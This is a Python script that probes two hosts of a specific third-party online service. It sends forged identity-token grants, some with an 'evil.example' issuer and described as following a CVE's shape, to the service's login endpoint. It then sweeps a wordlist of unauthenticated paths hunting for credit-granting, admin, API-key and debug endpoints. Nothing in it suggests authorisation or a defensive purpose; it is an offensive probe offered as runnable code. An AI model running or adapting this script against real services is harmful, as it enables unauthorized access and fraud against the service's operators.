import ssl, json, urllib.request, urllib.error, urllib.parse, sys, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
ctx = ssl.create_default_context()
KEY = "<publishable-key>"
SUPA = "https://cdn.onlyfakeai.ru"
OPS = "https://ops.onlyfakeai.ru"

def req(method, url, body=None, extra=None):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, repr(e)

print("===== grant types (CVE-2026-31813 shape / pkce / refresh) =====")
tests = [
    ("id_token azure", {"provider": "azure", "id_token": "x.y.z"}),
    ("id_token apple+issuer", {"provider": "apple", "issuer": "https://evil.example", "id_token": "x.y.z"}),
    ("id_token empty provider", {"provider": "", "issuer": "https://evil.example", "id_token": "x.y.z"}),
]
for label, body in tests:
    st, b = req("POST", SUPA + "/auth/v1/token?grant_type=id_token", body, {"apikey": KEY})
    print(f"[{label}] {st} {b[:220]}")
    time.sleep(0.5)
for gt, body in [("pkce", {"auth_code": "abc", "code_verifier": "def"}),
                 ("refresh_token", {"refresh_token": "bogus"}),
                 ("web3", {"message": "x", "signature": "y"})]:
    st, b = req("POST", SUPA + f"/auth/v1/token?grant_type={gt}", body, {"apikey": KEY})
    print(f"[{gt}] {st} {b[:220]}")
    time.sleep(0.5)

print("\n===== ops API-key consumption endpoint discovery (unauth GET) =====")
paths = """
/api/credits /api/credit /api/grant /api/grant-plan /api/grant_plan /api/add-credits /api/add_credits
/api/v1/credits /api/v1/grant /api/v1/admin/credits /api/v1/keys
/api/webhook /api/webhooks /api/webhook/telegram /api/telegram/webhook /api/telegram-webhook
/api/bot /api/telegram /api/external /api/service /api/internal /api/partner /api/partners
/api/keys /api/api-key /api/api-keys /api/auth/api-key /api/auth/key /api/auth/token /api/auth/refresh
/api/auth/me /api/auth/logout /api/auth/register /api/auth/reset /api/auth/forgot
/api/verify-key /api/validate-key /api/redeem /api/promo /api/promocode /api/support /api/messages
/api/admin/credits /api/admin/grant /api/credits/grant /api/grant/credits /api/token /api/tokens
/api/v1 /api/v2 /metrics /debug
""".split()
for p in paths:
    st, b = req("GET", OPS + p)
    if st not in (404,):
        print(f"  {p:32s} {st} {b[:150].replace(chr(10),' ')}")
    time.sleep(0.25)
print("done")
